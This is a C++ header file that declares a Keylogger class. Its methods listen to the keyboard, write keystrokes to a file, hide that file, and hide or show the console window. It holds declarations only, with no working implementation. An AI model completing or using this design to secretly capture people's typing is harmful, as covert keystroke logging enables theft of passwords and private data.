#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <string>

using namespace std;




class Keylogger {
	public:
		Keylogger();
		Keylogger(string fileName);
		int writeIntoFile(string words);
		int clearFile();
		void listenKeyboard();
		int setHiddenFile();
		bool isCapsLock();
		int hideConsole();
		int showConsole();
		string getFile();
		void setFile(string fileName);
		void setCaps(bool b);
		bool getCaps();

	
	private:
		bool capsStart = false;
		string filename;
		int capsOn = 0;
		int capsOff = 0;
		bool capsOnBool;
		int shift = 0;
		short key;
	
};






#endif
